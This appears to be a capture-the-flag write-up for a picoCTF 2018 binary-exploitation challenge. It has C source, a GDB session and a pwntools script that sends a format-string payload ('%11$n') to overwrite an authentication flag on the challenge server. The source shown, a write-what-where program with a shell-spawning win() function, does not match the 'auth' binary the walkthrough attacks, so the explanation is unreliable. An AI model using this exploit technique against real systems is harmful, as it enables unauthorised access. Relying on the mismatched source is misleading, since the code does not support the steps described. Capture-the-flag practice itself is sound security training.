Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

void win() {
  system("/bin/sh");
}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[256];
  
  unsigned int address;
  unsigned int value;

  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");

  scanf("%x", &address);

  sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
  puts(buf);
  
  scanf("%x", &value);

  sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
  puts(buf);

  *(unsigned int *)address = value;

  puts("Okay, exiting now...\n");
  exit(1);
  
}
```

So we have to change the value of the authenticated variable I'll use GDB

```bash
$ gdb auth
gef➤  disass main
.......................
0x080487f9 <+220>:   call   0x80484b0 <printf@plt>
.......................
gef➤  break *0x080487f9                                                      
Breakpoint 1 at 0x80487f9
gef➤  r                                                                      
Starting program: /home/c3t/ctf/picoctf/picoctf-2018/pwn/auth                
Would you like to read the flag? (yes/no)
AAAABBBB.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
gef➤  x &authenticated
0x804a04c <authenticated>:      0x00000000
gef➤  x/12wx $esp                                                            
0xffffd0a0:     0xffffd0cc      0x080489a6      0xf7fb3580      0x0804875a   
0xffffd0b0:     0x00000000      0x00000000      0xf7ffd000      0xffffd1c4   
0xffffd0c0:     0x00000000      0x00000534      0x000003e8      0x41414141
```

So the AAAA is in the 11th position, now we can send as payload 0x804a04c + %11$n

<br/>

And here's the script

```python
from pwn import *

host = '2018shell.picoctf.com'
port = 43438

p = remote(host,port)


p.recvuntil('Would you like to read the flag? (yes/no)')
p.sendline(p32(0x804a04c) + b'%11$n')
p.interactive()
```
